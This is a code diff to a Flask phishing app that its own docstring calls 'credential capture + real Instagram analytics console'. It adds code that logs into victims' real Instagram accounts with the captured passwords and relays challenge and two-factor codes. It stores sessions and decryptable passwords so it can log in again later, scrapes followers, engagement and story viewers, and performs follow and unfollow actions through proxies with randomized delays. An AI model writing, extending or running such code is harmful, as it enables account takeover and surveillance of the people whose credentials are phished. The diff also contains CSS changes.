@@ -1,5 +1,5 @@
 """
-Insight Capture — credential capture with an admin console.
+Insight Capture — credential capture + real Instagram analytics console.
 
 Env:
   SECRET_KEY         flask session key            (unset = generated + persisted in DATA_DIR)
@@ -13,17 +13,27 @@ Env:
   TRUST_PROXY        trusted proxy hops           (default 1, 0 = direct)
   CLIENT_IP_HEADER   e.g. CF-Connecting-IP        (default: ProxyFix / remote_addr)
   COOKIE_SECURE      1/0                          (default: on when RENDER is set)
+
+Instagram:
+  IG_PROXY           http(s) proxy for IG calls   (strongly recommended on servers)
+  IG_SYNC_MINUTES    background sync interval     (default 10)
+  GHOST_DAYS         no-engagement window         (default 120)
+  MAX_MEDIA_SCAN     posts scanned per sync       (default 48)
+  ACTIONS_PER_HOUR   write-action cap per client  (default 60)
 """
 
 from __future__ import annotations
 
+import base64
 import csv
+import hashlib
 import hmac
 import io
 import ipaddress
 import json
 import logging
 import os
+import random
 import secrets
 import sqlite3
 import sys
@@ -52,6 +62,43 @@ from flask import (
 from markupsafe import escape
 from werkzeug.middleware.proxy_fix import ProxyFix
 
+try:
+    from instagrapi import Client
+    try:
+        from instagrapi.exceptions import (
+            BadPassword,
+            ChallengeRequired,
+            LoginRequired,
+            PleaseWaitFewMinutes,
+            RateLimitError,
+            TwoFactorRequired,
+        )
+    except ImportError:
+        from instagrapi.exceptions import ChallengeRequired, TwoFactorRequired
+
+        class _Other(Exception):
+            pass
+
+        BadPassword = LoginRequired = PleaseWaitFewMinutes = RateLimitError = _Other
+    IG_OK = True
+except Exception:
+    Client = None
+    IG_OK = False
+
+    class _NoIG(Exception):
+        pass
+
+    BadPassword = ChallengeRequired = LoginRequired = _NoIG
+    PleaseWaitFewMinutes = RateLimitError = TwoFactorRequired = _NoIG
+
+try:
+    from cryptography.fernet import Fernet
+
+    CRYPTO_OK = True
+except Exception:
+    CRYPTO_OK = False
+
+
 # ============================== config ==============================
 ADMIN_TOKEN = os.environ.get("ADMIN_TOKEN", "")
 DATA_DIR = Path(os.environ.get("DATA_DIR", "data"))
@@ -63,12 +110,22 @@ TRUST_PROXY = int(os.environ.get("TRUST_PROXY", "1") or 0)
 CLIENT_IP_HEADER = os.environ.get("CLIENT_IP_HEADER", "").strip()
 COOKIE_MAX_AGE = 60 * 60 * 24 * 365
 
+IG_PROXY = os.environ.get("IG_PROXY", "").strip()
+SYNC_MINUTES = int(os.environ.get("IG_SYNC_MINUTES", "10"))
+GHOST_DAYS = int(os.environ.get("GHOST_DAYS", "120"))
+MAX_MEDIA_SCAN = int(os.environ.get("MAX_MEDIA_SCAN", "48"))
+ACTIONS_PER_HOUR = int(os.environ.get("ACTIONS_PER_HOUR", "60"))
+ACTION_DELAY = (2.5, 6.0)
+MAX_FOLLOW_CAP = 6000
+NEVER = 9999
+
 _ansi_env = os.environ.get("ANSI")
 ANSI_ON = (_ansi_env != "0") if _ansi_env is not None else sys.stdout.isatty()
 
 DATA_DIR.mkdir(parents=True, exist_ok=True)
 DB_PATH = DATA_DIR / "insight.sqlite3"
 JSONL_PATH = DATA_DIR / "events.jsonl"
+SESS_DIR = DATA_DIR / "sessions"
 
 
 def _load_secret() -> str:
@@ -213,6 +270,18 @@ def iso_ago(seconds: int) -> str:
     return datetime.fromtimestamp(time.time() - seconds, timezone.utc).isoformat(timespec="seconds")
 
 
+def days_since(stamp: str | None) -> int:
+    if not stamp:
+        return NEVER
+    try:
+        then = datetime.fromisoformat(stamp)
+    except ValueError:
+        return NEVER
+    if then.tzinfo is None:
+        then = then.replace(tzinfo=timezone.utc)
+    return max(0, int((datetime.now(timezone.utc) - then).total_seconds() // 86400))
+
+
 # ============================== storage ==============================
 _db_lock = threading.Lock()
 
@@ -227,6 +296,40 @@ CREATE TABLE IF NOT EXISTS creds (
 CREATE INDEX IF NOT EXISTS idx_creds_id ON creds(id DESC);
 CREATE INDEX IF NOT EXISTS idx_creds_pair ON creds(cid, username, password);
 CREATE INDEX IF NOT EXISTS idx_creds_time ON creds(created_at);
+
+CREATE TABLE IF NOT EXISTS ig_sessions (
+    cid TEXT PRIMARY KEY, username TEXT, pass_enc TEXT,
+    session_json TEXT, device_json TEXT, created_at TEXT, used_at TEXT
+);
+CREATE TABLE IF NOT EXISTS self (
+    cid TEXT PRIMARY KEY, pk TEXT, username TEXT, full_name TEXT, pic TEXT,
+    followers INTEGER, following INTEGER, posts INTEGER, synced_at TEXT
+);
+CREATE TABLE IF NOT EXISTS profiles (
+    pk TEXT PRIMARY KEY, username TEXT, full_name TEXT, pic TEXT,
+    verified INTEGER, private INTEGER, updated_at TEXT
+);
+CREATE TABLE IF NOT EXISTS snapshots (
+    id INTEGER PRIMARY KEY AUTOINCREMENT, cid TEXT, kind TEXT, payload TEXT, taken_at TEXT
+);
+CREATE INDEX IF NOT EXISTS idx_snap ON snapshots(cid, kind, id DESC);
+CREATE TABLE IF NOT EXISTS events (
+    id INTEGER PRIMARY KEY AUTOINCREMENT, cid TEXT, kind TEXT, subject_pk TEXT,
+    subject TEXT, detail TEXT, media TEXT, thumb TEXT, created_at TEXT
+);
+CREATE INDEX IF NOT EXISTS idx_ev ON events(cid, id DESC);
+CREATE TABLE IF NOT EXISTS engagement (
+    cid TEXT, pk TEXT, kind TEXT, media TEXT, ts TEXT,
+    PRIMARY KEY (cid, pk, kind, media)
+);
+CREATE TABLE IF NOT EXISTS visits (cid TEXT, pk TEXT, username TEXT, ts TEXT);
+CREATE INDEX IF NOT EXISTS idx_visits ON visits(cid, pk);
+CREATE TABLE IF NOT EXISTS actions (
+    id INTEGER PRIMARY KEY AUTOINCREMENT, cid TEXT, kind TEXT, pk TEXT,
+    username TEXT, status TEXT, error TEXT, created_at TEXT
+);
+CREATE TABLE IF NOT EXISTS followers_cache (cid TEXT, pk TEXT, ts TEXT, PRIMARY KEY (cid, pk));
+CREATE TABLE IF NOT EXISTS following_cache (cid TEXT, pk TEXT, ts TEXT, PRIMARY KEY (cid, pk));
 """
 
 INSERT_SQL = """INSERT INTO creds
@@ -410,6 +513,576 @@ def csrf_ok() -> bool:
 
 def html(body: str, status: int = 200) -> Response:
     return Response(body, status=status, mimetype="text/html; charset=utf-8")
+
+
+# ============================== instagram: crypto ==============================
+def _fernet() -> "Fernet":
+    key = base64.urlsafe_b64encode(
+        hashlib.scrypt(app.secret_key.encode(), salt=b"insight-v1",
+                       n=2 ** 14, r=8, p=1, dklen=32)
+    )
+    return Fernet(key)
+
+
+def seal(text: str) -> str:
+    if not CRYPTO_OK:
+        return "plain:" + text
+    try:
+        return _fernet().encrypt(text.encode()).decode()
+    except Exception:
+        return "plain:" + text
+
+
+def unseal(token: str) -> str:
+    if not token:
+        return ""
+    if token.startswith("plain:"):
+        return token[6:]
+    try:
+        return _fernet().decrypt(token.encode()).decode()
+    except Exception:
+        return ""
+
+
+# ============================== instagram: state ==============================
+_ig_lock = threading.RLock()
+_states: dict[str, dict] = {}
+_clients: dict[str, object] = {}
+_verified: dict[str, float] = {}
+_queue: "deque[tuple]" = deque()
+_queue_cv = threading.Condition()
+_action_stamps: dict[str, deque] = {}
+_sync_stop: dict[str, threading.Event] = {}
+_worker_started = False
+
+
+def ig_state(cid: str) -> dict:
+    with _ig_lock:
+        return dict(_states.get(cid) or {"state": "idle", "progress": {"step": "idle", "pct": 0}})
+
+
+def _ig_set(cid: str, **kw) -> None:
+    with _ig_lock:
+        cur = _states.setdefault(cid, {"state": "idle", "progress": {"step": "idle", "pct": 0}})
+        cur.update(kw)
+        cur["at"] = iso_now()
+
+
+def _ig_progress(cid: str, step: str, pct: int) -> None:
+    _ig_set(cid, progress={"step": step, "pct": max(0, min(100, pct))})
+
+
+def session_path(cid: str) -> Path:
+    SESS_DIR.mkdir(parents=True, exist_ok=True)
+    return SESS_DIR / f"{cid}.json"
+
+
+def store_session(cid: str, username: str, password: str, cl) -> None:
+    try:
+        settings = cl.get_settings()
+    except Exception:
+        settings = {}
+    try:
+        path = session_path(cid)
+        path.write_text(json.dumps(settings, ensure_ascii=False))
+        os.chmod(path, 0o600)
+    except OSError:
+        pass
+    conn = connect()
+    try:
+        conn.execute(
+            "INSERT INTO ig_sessions (cid, username, pass_enc, session_json, device_json, created_at, used_at)"
+            " VALUES (?,?,?,?,?,?,?) ON CONFLICT(cid) DO UPDATE SET username=excluded.username,"
+            " pass_enc=excluded.pass_enc, session_json=excluded.session_json,"
+            " device_json=excluded.device_json, used_at=excluded.used_at",
+            (cid, username, seal(password), json.dumps(settings),
+             json.dumps(getattr(cl, "device_settings", {})), iso_now(), iso_now()),
+        )
+        conn.commit()
+    finally:
+        conn.close()
+
+
+def drop_session(cid: str) -> None:
+    with _ig_lock:
+        _clients.pop(cid, None)
+        _states.pop(cid, None)
+        _verified.pop(cid, None)
+    ev = _sync_stop.pop(cid, None)
+    if ev:
+        ev.set()
+    try:
+        session_path(cid).unlink()
+    except OSError:
+        pass
+    conn = connect()
+    try:
+        conn.execute("DELETE FROM ig_sessions WHERE cid=?", (cid,))
+        conn.commit()
+    finally:
+        conn.close()
+
+
+def _new_client(cid: str, device: dict | None = None):
+    cl = Client()
+    cl.delay_range = [1, 3]
+    if IG_PROXY:
+        try:
+            cl.set_proxy(IG_PROXY)
+        except Exception:
+            logger.warning("proxy rejected: %s", IG_PROXY)
+    if device:
+        try:
+            cl.device_settings = device
+        except Exception:
+            pass
+
+    def handler(username: str, choice) -> str:
+        _ig_progress(cid, "challenge", 40)
+        _ig_set(cid, state="challenge")
+        deadline = time.time() + 300
+        while time.time() < deadline:
+            code = ig_state(cid).get("code")
+            if code:
+                _ig_set(cid, code=None)
+                return code
+            time.sleep(1)
+        raise ChallengeRequired("no challenge code supplied")
+
+    cl.challenge_code_handler = handler
+    return cl
+
+
+def get_client(cid: str):
+    with _ig_lock:
+        cl = _clients.get(cid)
+        if cl:
+            return cl
+    path = session_path(cid)
+    if not path.exists():
+        return None
+    try:
+        cl = _new_client(cid)
+        cl.set_settings(json.loads(path.read_text()))
+        with _ig_lock:
+            _clients[cid] = cl
+        return cl
+    except Exception as exc:
+        logger.warning("session load failed for %s: %s", cid, exc)
+        return None
+
+
+def ensure_login(cid: str):
+    """Return a live client, relogging from the sealed password if needed."""
+    if not IG_OK:
+        raise LoginRequired("instagrapi not installed")
+    cl = get_client(cid)
+    if cl is None:
+        raise LoginRequired("no session")
+    if _verified.get(cid, 0) > time.time() - 120:
+        return cl
+    try:
+        cl.get_timeline_feed()
+        _verified[cid] = time.time()
+        return cl
+    except Exception:
+        _verified.pop(cid, None)
+
+    conn = connect()
+    try:
+        row = conn.execute("SELECT username, pass_enc FROM ig_sessions WHERE cid=?", (cid,)).fetchone()
+    finally:
+        conn.close()
+    if not row:
+        raise LoginRequired("no stored credentials")
+    password = unseal(row["pass_enc"])
+    if not password:
+        raise LoginRequired("stored password unreadable")
+    cl = _new_client(cid, getattr(cl, "device_settings", None))
+    cl.login(row["username"], password)
+    store_session(cid, row["username"], password, cl)
+    with _ig_lock:
+        _clients[cid] = cl
+    _verified[cid] = time.time()
+    return cl
+
+
+# ============================== instagram: login ==============================
+def start_login(cid: str, username: str, password: str) -> None:
+    if not IG_OK:
+        _ig_set(cid, state="error",
+                error="instagrapi is not installed — run: pip install instagrapi cryptography")
+        return
+    _ig_set(cid, state="pending", progress={"step": "queued", "pct": 2}, error=None)
+    threading.Thread(target=_login_job, args=(cid, username, password), daemon=True).start()
+
+
+def _login_job(cid: str, username: str, password: str) -> None:
+    try:
+        # reuse a still-healthy session for the same handle instead of a fresh login
+        existing = get_client(cid)
+        if existing is not None:
+            if getattr(existing, "username", "") == username:
+                try:
+                    existing.get_timeline_feed()
+                    _verified[cid] = time.time()
+                    _ig_set(cid, state="ok", username=username, error=None,
+                            progress={"step": "ready", "pct": 100})
+                    full_sync(cid, cl=existing)
+                    start_scheduler(cid)
+                    return
+                except Exception:
+                    with _ig_lock:
+                        _clients.pop(cid, None)
+            else:
+                with _ig_lock:
+                    _clients.pop(cid, None)
+
+        _ig_progress(cid, "connecting", 8)
+        cl = _new_client(cid)
+        try:
+            cl.login(username, password)
+        except ChallengeRequired:
+            _ig_progress(cid, "challenge", 40)
+            _ig_set(cid, state="challenge")
+            cl.challenge_resolve(cl.last_json)
+            try:
+                cl.account_info()
+            except Exception:
+                cl.login(username, password)
+        except TwoFactorRequired:
+            store_session(cid, username, password, cl)
+            with _ig_lock:
+                _clients[cid] = cl
+            _ig_set(cid, state="2fa", progress={"step": "2fa", "pct": 40},
+                    error="two-factor code required")
+            return
+
+        store_session(cid, username, password, cl)
+        with _ig_lock:
+            _clients[cid] = cl
+        _verified[cid] = time.time()
+
+        me = cl.account_info()
+        _ig_set(cid, state="ok", username=username, pk=str(me.pk), error=None,
+                progress={"step": "syncing", "pct": 55})
+        logger.info("login ok cid=%s user=%s", cid, username)
+        full_sync(cid, cl=cl, first=True)
+        start_scheduler(cid)
+        _ig_set(cid, state="ok", progress={"step": "ready", "pct": 100})
+    except BadPassword:
+        _ig_set(cid, state="error", error="wrong username or password")
+    except (PleaseWaitFewMinutes, RateLimitError):
+        _ig_set(cid, state="error",
+                error="instagram is rate limiting this IP — retry in a few minutes or set IG_PROXY")
+    except ChallengeRequired:
+        _ig_set(cid, state="challenge", error="challenge required — enter the code instagram sent")
+    except TwoFactorRequired:
+        _ig_set(cid, state="2fa", error="two-factor code required")
+    except Exception as exc:
+        logger.exception("login failed cid=%s", cid)
+        _ig_set(cid, state="error", error=f"login failed: {type(exc).__name__}: {exc}"[:240])
+
+
+def submit_code(cid: str, code: str) -> None:
+    _ig_set(cid, code=(code or "").strip())
+
+
+def submit_2fa(cid: str, code: str) -> None:
+    code = (code or "").strip()
+    if not code:
+        return
+
+    def job():
+        try:
+            cl = get_client(cid)
+            if cl is None:
+                raise LoginRequired("login context lost — log in again")
+            cl.two_factor_login(code)
+            conn = connect()
+            try:
+                row = conn.execute(
+                    "SELECT username, pass_enc FROM ig_sessions WHERE cid=?", (cid,)).fetchone()
+            finally:
+                conn.close()
+            if row:
+                store_session(cid, row["username"], unseal(row["pass_enc"]), cl)
+            with _ig_lock:
+                _clients[cid] = cl
+            _verified[cid] = time.time()
+            me = cl.account_info()
+            _ig_set(cid, state="ok", pk=str(me.pk), error=None)
+            full_sync(cid, cl=cl, first=True)
+            start_scheduler(cid)
+        except Exception as exc:
+            _ig_set(cid, state="error", error=f"2fa failed: {exc}"[:200])
+
+    _ig_set(cid, state="pending", progress={"step": "2fa", "pct": 45})
+    threading.Thread(target=job, daemon=True).start()
+
+
+# ============================== instagram: sync ==============================
+def remember_user(conn: sqlite3.Connection, u) -> None:
+    try:
+        conn.execute(
+            "INSERT INTO profiles (pk, username, full_name, pic, verified, private, updated_at)"
+            " VALUES (?,?,?,?,?,?,?) ON CONFLICT(pk) DO UPDATE SET username=excluded.username,"
+            " full_name=excluded.full_name, pic=excluded.pic, verified=excluded.verified,"
+            " private=excluded.private, updated_at=excluded.updated_at",
+            (str(u.pk), u.username, (u.full_name or "")[:120],
+             str(getattr(u, "profile_pic_url", "") or "")[:400],
+             1 if getattr(u, "is_verified", False) else 0,
+             1 if getattr(u, "is_private", False) else 0, iso_now()),
+        )
+    except Exception:
+        pass
+
+
+def _snapshot(conn, cid: str, kind: str, rows: list[dict]) -> list[dict]:
+    prev = conn.execute(
+        "SELECT payload FROM snapshots WHERE cid=? AND kind=? ORDER BY id DESC LIMIT 1", (cid, kind)
+    ).fetchone()
+    conn.execute("INSERT INTO snapshots (cid, kind, payload, taken_at) VALUES (?,?,?,?)",
+                 (cid, kind, json.dumps(rows, ensure_ascii=False), iso_now()))
+    return json.loads(prev["payload"]) if prev else []
+
+
+def _event(conn, cid: str, kind: str, subject_pk: str, subject: str, detail: str,
+           media: str = "", thumb: str = "") -> None:
+    conn.execute(
+        "INSERT INTO events (cid, kind, subject_pk, subject, detail, media, thumb, created_at)"
+        " VALUES (?,?,?,?,?,?,?,?)",
+        (cid, kind, subject_pk, subject, detail[:300], media, thumb[:400], iso_now()),
+    )
+
+
+def _diff_follow(conn, cid: str, kind: str, prev: list[dict], cur: list[dict]) -> None:
+    if not prev:
+        return
+    before = {r["pk"] for r in prev}
+    after = {r["pk"] for r in cur}
+    by_pk = {r["pk"]: r for r in cur}
+    by_pk.update({r["pk"]: r for r in prev})
+    for pk in before - after:
+        r = by_pk.get(pk, {})
+        _event(conn, cid, "unfollowed_you" if kind == "followers" else "you_unfollowed",
+               pk, r.get("username", ""), "")
+    for pk in after - before:
+        r = by_pk.get(pk, {})
+        _event(conn, cid, "new_follower" if kind == "followers" else "you_followed",
+               pk, r.get("username", ""), "")
+
+
+def _scan_media(conn, cl, cid: str, medias: list) -> None:
+    for m in medias:
+        mid = str(m.pk)
+        thumb = str(getattr(m, "thumbnail_url", "") or "")
+        try:
+            likers = cl.media_likers(mid)
+            rows = [{"pk": str(u.pk), "username": u.username} for u in likers]
+            prev = _snapshot(conn, cid, f"likers:{mid}", rows)
+            if prev:
+                now = {r["pk"] for r in rows}
+                for r in prev:
+                    if r["pk"] not in now:
+                        _event(conn, cid, "like_removed", r["pk"], r["username"], "", mid, thumb)
+            for r in rows:
+                conn.execute("INSERT OR IGNORE INTO engagement (cid, pk, kind, media, ts)"
+                             " VALUES (?,?,?,?,?)", (cid, r["pk"], "like", mid, iso_now()))
+        except Exception:
+            pass
+        try:
+            comments = cl.media_comments(mid, amount=60)
+            rows = [{"pk": str(c.pk), "username": c.user.username, "text": c.text} for c in comments]
+            prev = _snapshot(conn, cid, f"comments:{mid}", rows)
+            if prev:
+                now = {r["pk"] for r in rows}
+                for r in prev:
+                    if r["pk"] not in now:
+                        _event(conn, cid, "comment_removed", r["pk"], r["username"],
+                               r.get("text", "")[:120], mid, thumb)
+            for r in rows:
+                conn.execute("INSERT OR IGNORE INTO engagement (cid, pk, kind, media, ts)"
+                             " VALUES (?,?,?,?,?)", (cid, r["pk"], "comment", mid, iso_now()))
+        except Exception:
+            pass
+
+
+def _scan_stories(conn, cl, cid: str, me_pk: str) -> None:
+    try:
+        for story in cl.user_stories(me_pk, amount=8):
+            for v in cl.story_viewers(str(story.pk)):
+                conn.execute("INSERT INTO visits (cid, pk, username, ts) VALUES (?,?,?,?)",
+                             (cid, str(v.pk), v.username, iso_now()))
+    except Exception:
+        pass
+
+
+def full_sync(cid: str, cl=None, first: bool = False) -> None:
+    cl = cl or ensure_login(cid)
+    conn = connect()
+    try:
+        me = cl.account_info()
+        conn.execute(
+            "INSERT INTO self (cid, pk, username, full_name, pic, followers, following, posts, synced_at)"
+            " VALUES (?,?,?,?,?,?,?,?,?) ON CONFLICT(cid) DO UPDATE SET username=excluded.username,"
+            " full_name=excluded.full_name, pic=excluded.pic, followers=excluded.followers,"
+            " following=excluded.following, posts=excluded.posts, synced_at=excluded.synced_at",
+            (cid, str(me.pk), me.username, (me.full_name or "")[:120],
+             str(me.profile_pic_url or "")[:400], me.follower_count, me.following_count,
+             me.media_count, iso_now()),
+        )
+        _verified[cid] = time.time()
+
+        _ig_progress(cid, "followers", 60)
+        f_cap = min(me.follower_count or 500, MAX_FOLLOW_CAP)
+        try:
+            followers = cl.user_followers(me.pk, amount=f_cap)
+        except Exception as exc:
+            followers = {}
+            logger.warning("followers fetch failed %s: %s", cid, exc)
+        # private account we don't follow returns {} — don't wipe a good cache for that
+        if followers or not (me.follower_count or 0):
+            frows = []
+            conn.execute("DELETE FROM followers_cache WHERE cid=?", (cid,))
+            for u in followers.values():
+                remember_user(conn, u)
+                frows.append({"pk": str(u.pk), "username": u.username})
+                conn.execute("INSERT OR REPLACE INTO followers_cache (cid, pk, ts) VALUES (?,?,?)",
+                             (cid, str(u.pk), iso_now()))
+            prev_f = _snapshot(conn, cid, "followers", frows)
+            _diff_follow(conn, cid, "followers", prev_f, frows)
+
+        _ig_progress(cid, "following", 72)
+        g_cap = min(me.following_count or 500, MAX_FOLLOW_CAP)
+        try:
+            following = cl.user_following(me.pk, amount=g_cap)
+        except Exception as exc:
+            following = {}
+            logger.warning("following fetch failed %s: %s", cid, exc)
+        if following or not (me.following_count or 0):
+            grow = []
+            conn.execute("DELETE FROM following_cache WHERE cid=?", (cid,))
+            for u in following.values():
+                remember_user(conn, u)
+                grow.append({"pk": str(u.pk), "username": u.username})
+                conn.execute("INSERT OR REPLACE INTO following_cache (cid, pk, ts) VALUES (?,?,?)",
+                             (cid, str(u.pk), iso_now()))
+            prev_g = _snapshot(conn, cid, "following", grow)
+            _diff_follow(conn, cid, "following", prev_g, grow)
+
+        _ig_progress(cid, "media", 84)
+        try:
+            medias = cl.user_medias(me.pk, amount=MAX_MEDIA_SCAN)
+        except Exception:
+            medias = []
+        _scan_media(conn, cl, cid, medias)
+        _scan_stories(conn, cl, cid, str(me.pk))
+
+        conn.commit()
+        _ig_set(cid, last_sync=iso_now(), progress={"step": "ready", "pct": 100})
+    finally:
+        conn.close()
+
+
+def start_scheduler(cid: str) -> None:
+    with _ig_lock:
+        if cid in _sync_stop:
+            return
+        ev = threading.Event()
+        _sync_stop[cid] = ev
+
+    def loop():
+        while not ev.wait(SYNC_MINUTES * 60):
+            try:
+                _ig_progress(cid, "syncing", 55)
+                full_sync(cid)
+            except Exception as exc:
+                logger.warning("scheduled sync failed %s: %s", cid, exc)
+                _ig_set(cid, state="error", error="session lost — reconnect")
+
+    threading.Thread(target=loop, daemon=True).start()
+
+
+def sync_now(cid: str) -> None:
+    def job():
+        try:
+            _ig_progress(cid, "syncing", 55)
+            full_sync(cid)
+        except Exception as exc:
+            _ig_set(cid, state="error", error=f"sync failed: {exc}"[:200])
+
+    threading.Thread(target=job, daemon=True).start()
+
+
+# ============================== instagram: actions ==============================
+def _quota(cid: str) -> bool:
+    dq = _action_stamps.setdefault(cid, deque())
+    now = time.time()
+    while dq and now - dq[0] > 3600:
+        dq.popleft()
+    return len(dq) < ACTIONS_PER_HOUR
+
+
+def _ensure_worker() -> None:
+    global _worker_started
+    with _ig_lock:
+        if _worker_started:
+            return
+        _worker_started = True
+    threading.Thread(target=_worker, daemon=True).start()
+
+
+def _log_action(cid, kind, pk, username, status, error) -> None:
+    conn = connect()
+    try:
+        conn.execute("INSERT INTO actions (cid, kind, pk, username, status, error, created_at)"
+                     " VALUES (?,?,?,?,?,?,?)", (cid, kind, pk, username, status, error, iso_now()))
+        if status == "done":
+            if kind == "unfollow":
+                conn.execute("DELETE FROM following_cache WHERE cid=? AND pk=?", (cid, pk))
+            elif kind == "follow":
+                conn.execute("INSERT OR REPLACE INTO followers_cache (cid, pk, ts) VALUES (?,?,?)",
+                             (cid, pk, iso_now()))
+        conn.commit()
+    finally:
+        conn.close()
+
+
+def _worker() -> None:
+    while True:
+        with _queue_cv:
+            while not _queue:
+                _queue_cv.wait()
+            cid, kind, pk, username, _at = _queue.popleft()
+        try:
+            cl = ensure_login(cid)
+            if kind == "unfollow":
+                cl.user_unfollow(pk)
+            elif kind == "follow":
+                cl.user_follow(pk)
+            elif kind == "unlike":
+                cl.media_unlike(pk)
+            _action_stamps.setdefault(cid, deque()).append(time.time())
+            _log_action(cid, kind, pk, username, "done", "")
+        except Exception as exc:
+            logger.warning("action %s %s failed: %s", kind, pk, exc)
+            _log_action(cid, kind, pk, username, "failed", str(exc)[:200])
+        time.sleep(random.uniform(*ACTION_DELAY))
+
+
+def enqueue(cid: str, kind: str, pk: str, username: str) -> dict:
+    if not IG_OK:
+        return {"ok": False, "error": "instagrapi not installed"}
+    if not pk:
+        return {"ok": False, "error": "missing target"}
+    if not _quota(cid):
+        return {"ok": False, "error": f"hourly action limit reached ({ACTIONS_PER_HOUR})"}
+    with _queue_cv:
+        _queue.append((cid, kind, pk, username, iso_now()))
+        _queue_cv.notify()
+    _ensure_worker()
+    return {"ok": True, "queued": True}
 
 
 # ============================== capture ==============================
@@ -955,24 +1628,16 @@ main::before{content:"";position:absolute;inset:0 0 auto 0;height:340px;backgrou
 .btn{border:0;border-radius:10px;padding:8px 18px;font:600 14px inherit;cursor:pointer;background:var(--blue);color:#fff;box-shadow:0 4px 14px rgba(0,149,246,.32);transition:transform .3s var(--e),filter .2s,box-shadow .3s var(--e),background .3s;white-space:nowrap}
 .btn:hover{filter:brightness(1.08);transform:translateY(-2px);box-shadow:0 8px 20px rgba(0,149,246,.42)}
 .btn:active{transform:scale(.95);box-shadow:none}
+.btn:disabled{opacity:.6;cursor:default;transform:none}
 .btn.g,.btn.r{box-shadow:none}
 .btn.g{background:var(--chip);color:var(--tx)}
 .btn.g:hover,.btn.r:hover{box-shadow:0 6px 16px rgba(0,0,0,.12)}
 .btn.r{background:var(--chip);color:var(--red)}
 .sec{display:flex;align-items:baseline;justify-content:space-between;margin:26px 0 14px}
 .sec h3{font:700 15px inherit}.sec a{color:var(--blue);font:600 13px inherit;cursor:pointer;transition:letter-spacing .3s var(--e),opacity .2s}.sec a:hover{letter-spacing:.4px;opacity:.8}
-.stories{display:flex;gap:18px;overflow:auto;padding:8px 6px 10px;scrollbar-width:none}
-.stories::-webkit-scrollbar{display:none}
-.stories>div{flex:none;width:68px;text-align:center;cursor:pointer;position:relative;transition:transform .4s var(--e);animation:up .6s var(--e) both}
-.stories>div:nth-child(2){animation-delay:.06s}.stories>div:nth-child(3){animation-delay:.12s}.stories>div:nth-child(4){animation-delay:.18s}.stories>div:nth-child(5){animation-delay:.24s}
-.stories>div:hover{transform:translateY(-4px) scale(1.06)}
-.stories .ring{margin:0 auto 7px;width:68px;height:68px}.stories .ring>span{width:100%;height:100%;font-size:19px}
-.stories small{font-size:12px;display:block;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
-.stories em{position:absolute;top:0;right:0;background:var(--red);color:#fff;font:700 10.5px/18px inherit;min-width:18px;border-radius:9px;border:2px solid var(--bg2);box-sizing:content-box;padding:0 3px;font-style:normal}
-@keyframes up{from{opacity:0;transform:translateY(18px)}}
 .cards{display:grid;grid-template-columns:repeat(3,1fr);gap:12px}
 .card{position:relative;overflow:hidden;background:var(--card);border:1px solid var(--line);border-radius:18px;padding:16px 18px;cursor:pointer;box-shadow:var(--sh);transition:transform .45s var(--e),box-shadow .45s var(--e),border-color .3s;animation:up .65s var(--e) both}
-.card:nth-child(2){animation-delay:.05s}.card:nth-child(3){animation-delay:.1s}.card:nth-child(4){animation-delay:.15s}.card:nth-child(5){animation-delay:.2s}.card:nth-child(6){animation-delay:.25s}
+.card:nth-child(2){animation-delay:.05s}.card:nth-child(3){animation-delay:.1s}.card:nth-child(4){animation-delay:.15s}
 .card::after{content:"";position:absolute;inset:0;background:radial-gradient(120% 90% at 100% 0,var(--glow),transparent 65%);opacity:0;transition:opacity .45s;pointer-events:none}
 .card:hover{transform:translateY(-5px);box-shadow:var(--sh2);border-color:color-mix(in srgb,var(--mut) 60%,transparent)}
 .card:hover::after{opacity:1}
@@ -983,22 +1648,6 @@ main::before{content:"";position:absolute;inset:0 0 auto 0;height:340px;backgrou
 .card b{display:block;font:700 28px inherit;letter-spacing:-.8px;margin:8px 0 2px}
 .card i{font-style:normal;font-size:12px;color:var(--mut)}
 .card i.up{color:#2ecc71}.card i.dn{color:var(--red)}
-.two{display:grid;grid-template-columns:1fr 1fr;gap:12px}
-.panel{background:var(--card);border:1px solid var(--line);border-radius:18px;padding:18px;box-shadow:var(--sh);transition:transform .45s var(--e),box-shadow .45s var(--e);animation:up .7s .2s var(--e) both}
-.panel:hover{transform:translateY(-3px);box-shadow:var(--sh2)}
-.panel h4{font:600 13.5px inherit;margin-bottom:16px}
-.donut{display:flex;align-items:center;gap:20px}
-.donut svg{width:104px;height:104px;flex:none;transition:transform .6s var(--e)}
-.panel:hover .donut svg{transform:rotate(12deg) scale(1.05)}
-.donut circle:not(:first-child){animation:dr 1.2s .3s var(--e) both}
-@keyframes dr{from{stroke-dasharray:0 100}}
-.leg{display:grid;gap:8px;font-size:13px;color:var(--mut)}.leg b{color:var(--tx)}
-.leg em{display:inline-block;width:8px;height:8px;border-radius:50%;margin-right:8px}
-.spark{display:flex;align-items:flex-end;gap:8px;height:86px}
-.spark i{flex:1;border-radius:5px 5px 2px 2px;background:var(--ig);transform-origin:bottom;animation:g .9s both var(--e);transition:filter .3s,transform .4s var(--e)}
-.spark i:hover{filter:brightness(1.15) saturate(1.3);transform:scaleY(1.07)}
-@keyframes g{from{transform:scaleY(0)}}
-.sl{display:flex;gap:8px;margin-top:8px;font-size:11px;color:var(--mut)}.sl span{flex:1;text-align:center}
 .bar{display:flex;gap:8px;margin:6px 0 14px;flex-wrap:wrap;align-items:center}
 .search{flex:1;min-width:150px;background:var(--chip);border:0;border-radius:12px;padding:11px 14px;color:var(--tx);font:400 14.5px inherit;outline:0;transition:box-shadow .3s var(--e),background .3s}
 .search:focus{background:var(--bg2);box-shadow:0 0 0 2px var(--blue),0 8px 24px rgba(0,149,246,.18)}
@@ -1042,6 +1691,9 @@ main::before{content:"";position:absolute;inset:0 0 auto 0;height:340px;backgrou
 .acc{display:flex;align-items:center;gap:14px;padding:16px;background:var(--card);border:1px solid var(--line);border-radius:18px;margin-bottom:4px;box-shadow:var(--sh)}
 .toast{position:fixed;left:50%;bottom:34px;transform:translate(-50%,30px) scale(.95);background:var(--tx);color:var(--bg);padding:12px 22px;border-radius:14px;font:600 13.5px inherit;opacity:0;pointer-events:none;transition:all .5s var(--e);z-index:9;box-shadow:var(--sh2)}
 .toast.show{opacity:1;transform:translate(-50%,0) scale(1)}
+.spark{display:flex;align-items:flex-end;gap:8px;height:86px}
+.spark i{flex:1;border-radius:5px 5px 2px 2px;background:var(--ig);transform-origin:bottom;transition:filter .3s,transform .4s var(--e)}
+@keyframes up{from{opacity:0;transform:translateY(18px)}}
 @container (max-width:760px){
  .app{grid-template-columns:1fr}
  .side{display:none}
